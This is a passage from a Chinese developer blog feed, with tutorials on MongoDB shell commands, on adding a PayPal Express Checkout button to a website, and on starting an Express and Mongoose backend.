class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.createCollection(<span class="string">&#x27;myCol&#x27;</span>)</span></span><br><span class="line">&#123; &quot;ok&quot; : 1 &#125;</span><br></pre></td></tr></table></figure><p>创建时可以带参数<code>options</code></p><p>options参数是可选的，因此只需要指定集合的名称。 以下是可以使用的选项列表：</p><table><thead><tr><th>字段</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>capped</td><td>Boolean</td><td>(可选)如果为true，则启用封闭的集合。上限集合是固定大小的集合，它在达到其最大大小时自动覆盖其最旧的条目。 如果指定true，则还需要指定size参数。</td></tr><tr><td>autoIndexId</td><td>Boolean</td><td>(可选)如果为true，则在_id字段上自动创建索引。默认值为false。</td></tr><tr><td>size</td><td>数字</td><td>(可选)指定上限集合的最大大小(以字节为单位)。 如果capped为true，那么还需要指定此字段的值。</td></tr><tr><td>max</td><td>数字</td><td>(可选)指定上限集合中允许的最大文档数。</td></tr></tbody></table><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.createCollection(<span class="string">&quot;myCol2&quot;</span>, &#123;capped : <span class="literal">true</span>, autoIndexId : <span class="literal">true</span>, size : 6142800, max : 10000 &#125;)</span></span><br><span class="line">&#123;</span><br><span class="line">&quot;note&quot; : &quot;the autoIndexId option is deprecated and will be removed in a future release&quot;,</span><br><span class="line">&quot;ok&quot; : 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7.查看创建的集合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">show collections</span></span><br><span class="line">myCol</span><br><span class="line">myCol2</span><br></pre></td></tr></table></figure><p>8.删除指定的集合 <code>db.collection.drop()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol2.drop()</span></span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>9.插入文档 <code>db.collection.insert(&#123;&#125;)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.insert(&#123;</span></span><br><span class="line">title: &#x27;learn mongodb&#x27;, </span><br><span class="line">url: &#x27;https://blog.zhengxiangling.com&#x27;,</span><br><span class="line">    view: &#x27;99&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)</span><br></pre></td></tr></table></figure><p>其他插入方法</p><ul><li>db.post.save(document)</li><li>db.collection.insertOne()</li><li>db.collection.insertMany()</li></ul><p></p><p>10.查询集合 <code>db.collection.find()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.find()</span></span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;), &quot;title&quot; : &quot;learn mongodb&quot;, &quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;, &quot;view&quot; : &quot;99&quot; &#125;</span><br></pre></td></tr></table></figure><p>结合<code>preey()</code>方法，格式化输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.find().pretty()</span></span><br><span class="line">&#123;</span><br><span class="line">&quot;_id&quot; : ObjectId(&quot;5a6eda148517fad4b57bd75e&quot;),</span><br><span class="line">&quot;title&quot; : &quot;learn mongodb&quot;,</span><br><span class="line">&quot;url&quot; : &quot;https://blog.zhengxiangling.com&quot;,</span><br><span class="line">&quot;view&quot; : &quot;99&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加参数的查找</p><table><thead><tr><th>操作</th><th>语法</th><th>示例</th><th>RDBMS等效语句</th></tr></thead><tbody><tr><td>相等</td><td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;by&quot;:&quot;yiibai&quot;&#125;).pretty()</code></td><td><code>where by = &#39;yiibai&#39;</code></td></tr><tr><td>小于</td><td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$lt:50&#125;&#125;).pretty()</code></td><td><code>where likes &lt; 50</code></td></tr><tr><td>小于等于</td><td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$lte:50&#125;&#125;).pretty()</code></td><td><code>where likes &lt;= 50</code></td></tr><tr><td>大于</td><td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$gt:50&#125;&#125;).pretty()</code></td><td><code>where likes &gt; 50</code></td></tr><tr><td>大于等于</td><td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$gte:50&#125;&#125;).pretty()</code></td><td><code>where likes &gt;= 50</code></td></tr><tr><td>不等于</td><td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td><td><code>db.mycol.find(&#123;&quot;likes&quot;:&#123;$ne:50&#125;&#125;).pretty()</code></td><td><code>where likes != 50</code></td></tr></tbody></table><p>结合<code>and</code>或者<code>or</code>查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">db.mycol.find(</span></span><br><span class="line">   &#123;</span><br><span class="line">      $and: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">db.mycol.find(</span></span><br><span class="line">   &#123;</span><br><span class="line">      $or: [</span><br><span class="line">         &#123;key1: value1&#125;, &#123;key2:value2&#125;</span><br><span class="line">      ]</span><br><span class="line">   &#125;</span><br><span class="line">).pretty()</span><br></pre></td></tr></table></figure><p>设置查找到的文档要显示出的字段，如只显示<code>_id</code>和<code>title</code>，<code>1</code>表示显示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.mycol.find(&#123;&#125;, &#123;&#x27;_id&#x27;:1, &#x27;title&#x27;:1&#125;)</span><br></pre></td></tr></table></figure><p>11.更新文档 <code>update</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.update(&#123;title: <span class="string">&#x27;learn mongodb&#x27;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;title: <span class="string">&#x27;update title&#x27;</span>&#125;&#125;)</span></span><br><span class="line">WriteResult(&#123; &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 &#125;)</span><br></pre></td></tr></table></figure><p>默认只会修改匹配到的第一个文档，若要修改所有匹配到的文档，将参数<code>multi</code>设置为<code>true</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">db.myCol.update(&#123;title: <span class="string">&#x27;learn mongodb&#x27;</span>&#125;, &#123;<span class="variable">$set</span>: &#123;title: <span class="string">&#x27;update title&#x27;</span>&#125;, &#123;multi: <span class="literal">true</span>&#125;&#125;)</span></span><br></pre></td></tr></table></figure><p>12.删除文档 <code>remove</code></p><p>删除匹配到的所有文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;)</span><br></pre></td></tr></table></figure><p>如果想只删除匹配到的第一条文档，加参数<code>1</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.remove(&#123;view: &#x27;99&#x27;&#125;, 1)</span><br></pre></td></tr></table></figure><p>把集合下的所有文档都删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.remove()</span><br></pre></td></tr></table></figure><p>13.限制记录数 <code>limit()</code>,<code>skip()</code><br>比如查询到的记录有10条，只想要前5条，可以用<code>limit()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.find().limit(5)</span><br></pre></td></tr></table></figure><p>比如查询出的数据，不想要前3条，可以调过前三条的文档，可以用<code>skip()</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.find().skip(3)</span><br></pre></td></tr></table></figure><p>14.排序记录 <code>sort</code><br>可以多查询出的文档记录进行排序,<code>1</code>代表升序，<code>-1</code>代表降序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.myCol.find().sort(&#123;&#x27;_id&#x27;: 1&#125;)</span><br><span class="line"></span><br><span class="line">db.myCol.find().sort(&#123;&#x27;_id&#x27;: -1&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Mongo DB </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web站点接入PayPal支付</title>
      <link href="/2018/01/25/web%E7%AB%99%E7%82%B9%E6%8E%A5%E5%85%A5PayPal%E6%94%AF%E4%BB%98/"/>
      <url>/2018/01/25/web%E7%AB%99%E7%82%B9%E6%8E%A5%E5%85%A5PayPal%E6%94%AF%E4%BB%98/</url>
      
        <content type="html"><![CDATA[<p>官方教程：<br><a href="https://developer.paypal.com/docs/integration/direct/express-checkout/integration-jsv4/">PayPal Express Checkout</a></p><p>根据官方教程整理了一下具体步骤。</p><span id="more"></span><p>模板：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.paypalobjects.com/api/checkout.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;paypal-button&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      paypal.<span class="property">Button</span>.<span class="title function_">render</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">locale</span>: <span class="string">&#x27;zh_CN&#x27;</span>, <span class="comment">// or en_US</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">env</span>: <span class="string">&#x27;production&#x27;</span>, <span class="comment">// or sandbox</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">commit</span>: <span class="literal">true</span>, <span class="comment">// Show a &#x27;Pay Now&#x27; button</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">client</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="attr">sandbox</span>:    <span class="string">&#x27;***&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="attr">production</span>: <span class="string">&#x27;***&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">style</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="attr">size</span>: <span class="string">&#x27;small&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="attr">color</span>: <span class="string">&#x27;silver&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="attr">shape</span>: <span class="string">&#x27;pill&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="attr">label</span>: <span class="string">&#x27;checkout&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="attr">tagline</span>: <span class="literal">false</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">payment</span>: <span class="keyword">function</span>(<span class="params">data, actions</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">return</span> actions.<span class="property">payment</span>.<span class="title function_">create</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  <span class="attr">payment</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                      <span class="attr">transactions</span>: [</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                          &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                              <span class="attr">amount</span>: &#123; <span class="attr">total</span>: <span class="string">&#x27;填入金额&#x27;</span>, <span class="attr">currency</span>: <span class="string">&#x27;USD&#x27;</span> &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                      ]</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">onAuthorize</span>: <span class="keyword">function</span>(<span class="params">data, actions</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="keyword">return</span> actions.<span class="property">payment</span>.<span class="title function_">execute</span>().<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">payment</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  $.<span class="title function_">ajax</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    <span class="attr">type</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    <span class="attr">url</span>: <span class="string">&#x27;/&#x27;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                    <span class="attr">data</span>: &#123;&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  &#125;).<span class="title function_">done</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                      <span class="keyword">if</span> (data == <span class="string">&#x27;0&#x27;</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                          <span class="title function_">alert</span>(<span class="string">&#x27;The payment is complete!&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                          <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                      &#125;<span class="keyword">else</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                          <span class="title function_">alert</span>(<span class="string">&#x27;pay fail&#x27;</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                      &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  &#125;)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">onCancel</span>: <span class="keyword">function</span>(<span class="params">data, actions</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="comment">/*</span></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"><span class="language-xml">               * Buyer cancelled the payment</span></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"><span class="language-xml">               */</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="attr">onError</span>: <span class="keyword">function</span>(<span class="params">err</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">              <span class="comment">/*</span></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"><span class="language-xml">              * An error occurred during the transaction</span></span></span></span><br><span class="line"><span class="comment"><span class="language-javascript"><span class="language-xml">              */</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      &#125;, <span class="string">&#x27;#paypal-button&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h5 id="1-必须-js"><a href="#1-必须-js" class="headerlink" title="1. 必须 js"></a>1. 必须 js</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://www.paypalobjects.com/api/checkout.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="2-支付按钮"><a href="#2-支付按钮" class="headerlink" title="2. 支付按钮"></a>2. 支付按钮</h5><p><code>&lt;div id=&quot;paypal-button&quot;&gt;&lt;/div&gt;</code>，<code>paypal.Button.render</code>绑定对应的id(也可以是class)。</p><h5 id="3-render-参数"><a href="#3-render-参数" class="headerlink" title="3. render 参数"></a>3. render 参数</h5><p>1)<code>env</code>： 运行环境<br>有两种：</p><table><thead><tr><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>sandbox</td><td>沙盒，用于测试，用添加的sandbox账号测试能否交易成功</td></tr><tr><td>production</td><td>生产环境，部署上线时使用的环境</td></tr></tbody></table><p>2)locale： 语言版本<br>配套有多国语言，中文选用 <code>zh_CN</code>，美式英文选用 <code>en_US</code></p><p>3）<code>client</code>： 客户端<code>id</code><br>获取方式：登录 -&gt; <a href="https://developer.paypal.com/developer/applications/">Applications</a>  -&gt; 选择 REST API apps -&gt; create App<br><img src="https://cdn.zhengxiangling.com/18-1-25/637642.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/18-1-25/637642.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>创建成功后，可以从创建的应用获取<code>Sandbox</code> 和 <code>Live</code> 的 <code>client ID</code>，填入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">client</span>: &#123;</span><br><span class="line">  <span class="attr">sandbox</span>:    <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">production</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>4)<code>style</code>： 定义支付按钮样式，参考 <a href="https://developer.paypal.com/docs/integration/direct/express-checkout/integration-jsv4/customize-button/">Customize Checkout Button</a></p><p>5)触发函数：</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>payment</td><td>点击支付时触发，total填入需要支付的金额，currency填入支付的货币类型</td></tr><tr><td>onAuthorize</td><td>支付成功时触发，当支付成功时可以用Ajax提交数据修改订单支付状态为已支付。</td></tr><tr><td>onCancel</td><td>当用户关闭支付页面时触发</td></tr><tr><td>onError</td><td>当支付出错时触发</td></tr></tbody></table><h5 id="4-创建沙盒账号用于测试"><a href="#4-创建沙盒账号用于测试" class="headerlink" title="4. 创建沙盒账号用于测试"></a>4. 创建沙盒账号用于测试</h5><p><a href="https://developer.paypal.com/developer/accounts/">Sandbox accounts</a><br>创建两个账号，BUSSINESS 以及 PERSONAL。<br>创建完成后登录沙盒账号测试是否登录成功（红线按钮登录）<br><img src="https://cdn.zhengxiangling.com/18-1-25/63582846.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/18-1-25/63582846.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h5 id="5-使用sandbox-账号测试支付"><a href="#5-使用sandbox-账号测试支付" class="headerlink" title="5. 使用sandbox 账号测试支付"></a>5. 使用sandbox 账号测试支付</h5><p>当<code>env</code>环境为<code>sandbox</code>时，点击支付按钮时，使用<code>PERSONAL</code>账号来登录支付（测试账号默认有余额 $9999），当支付成功时会调用函数<code>onAuthorize</code>,可以弹窗<code>alert(&#39;pay success&#39;)</code>来测试是否支付成功。若成功，上线时将<code>env</code>转为<code>production</code>环境即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PayPal </tag>
            
            <tag> 支付 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>express 搭建后台</title>
      <link href="/2018/01/18/express-%E6%90%AD%E5%BB%BA%E5%90%8E%E5%8F%B0/"/>
      <url>/2018/01/18/express-%E6%90%AD%E5%BB%BA%E5%90%8E%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<p>安装 express</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">express sudo cnpm i express -g</span><br></pre></td></tr></table></figure><p>安装 express 生成器 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install express-generator -g</span><br></pre></td></tr></table></figure><p>安装 mongodb 数据库 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#mac</span><br><span class="line">brew install mongodb </span><br></pre></td></tr></table></figure><span id="more"></span><p><a href="https://github.com/StevenSLXie/Tutorials-for-Web-Developers/blob/master/MongoDB%20%E6%9E%81%E7%AE%80%E5%AE%9E%E8%B7%B5%E5%85%A5%E9%97%A8.md">MongoDB 极简实践入门</a></p><p>启动mongodb 的方式</p><figure class="highlight plaintext"><figcaption><span>js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongod —config /usr/local/etc/mongod.conf</span><br><span class="line">(登录权限需要自行设置)</span><br></pre></td></tr></table></figure><p>下载 mongodb GUI 工具 Robo 3T<br>自行安装</p><p>安装 mongoose<br>node.js异步环境下对mongodb进行便捷操作的对象模型工具</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm install mongoose --save</span><br></pre></td></tr></table></figure><p>创建一个名为server的应用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">express server</span><br></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd server</span><br><span class="line">cnpm install</span><br></pre></td></tr></table></figure><p>启动应用的方式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="title class_">Mac</span> or <span class="title class_">Linux</span></span><br><span class="line"><span class="variable constant_">DEBUG</span>=myapp npm start </span><br><span class="line"># <span class="title class_">Windows</span></span><br><span class="line">set <span class="variable constant_">DEBUG</span>=myapp &amp; npm start </span><br></pre></td></tr></table></figure><p>操作mongodb，增加数据库myapp及集合goods</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 增加数据库</span><br><span class="line">use myapp</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line">db.<span class="property">goods</span>.<span class="title function_">insert</span>(&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;price&#x27;</span>: <span class="string">&#x27;5&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>在server目录下创建文件夹，用于保存模型models<br>如：<br>创建一个goods模型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">goods.<span class="property">js</span></span><br><span class="line"><span class="keyword">let</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Schema</span> = mongoose.<span class="property">Schema</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> productSchema = <span class="keyword">new</span> <span class="title 